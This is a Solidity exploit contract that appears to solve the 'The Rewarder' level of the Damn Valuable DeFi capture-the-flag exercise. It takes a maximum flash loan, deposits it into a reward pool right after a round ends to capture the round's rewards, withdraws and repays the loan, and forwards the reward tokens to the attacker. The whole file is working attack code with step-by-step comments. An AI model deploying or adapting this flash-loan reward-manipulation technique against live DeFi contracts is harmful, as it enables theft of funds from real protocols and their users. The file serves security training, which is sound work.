pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";

contract RewarderExploit {
    TheRewarderPool rewardPool;
    FlashLoanerPool flashLoanerPool;
    RewardToken rewardToken;
    DamnValuableToken liquidityToken;
    address owner;
    constructor(address rewardPoolAddress, address flashLoanerPoolAddress, address liquidityAddress, address rewardTokenAddress) {
        //Initialization
        rewardPool = TheRewarderPool(rewardPoolAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        liquidityToken = DamnValuableToken(liquidityAddress);
        owner = msg.sender;
    }
    // Execution requirements:
    // 5 day passed so participants can be rewarded
    // First interaction after said period to exploit bug. 
    function exploit() external{
        // Safety measure
        require(msg.sender == owner);
        // Establishing of loan pool balance
        uint256 maxLoanAmount = liquidityToken.balanceOf(address(flashLoanerPool));
        // Taking maximum possible flash loan
        flashLoanerPool.flashLoan(maxLoanAmount);//99960*10**19);
    }
    // Called by flashLoanerPool , argument is loaned amount
    function receiveFlashLoan(uint256 amount) external{
        // Allow transaction by rewardPool
        liquidityToken.approve(address(rewardPool), amount);
        // First deposit when round ends counts as if deposited during round, reward is calculated then automatically.
        rewardPool.deposit(amount);
        // Loaned can be then withdrawn to contract
        rewardPool.withdraw(amount);
        // Tokens get transferred back to flashLoanerPool
        liquidityToken.transfer(address(flashLoanerPool), amount);
        // Withdrawal of all reward tokens to attacker
        require(rewardToken.transfer(owner, rewardToken.balanceOf(address(this))));
    }
    
}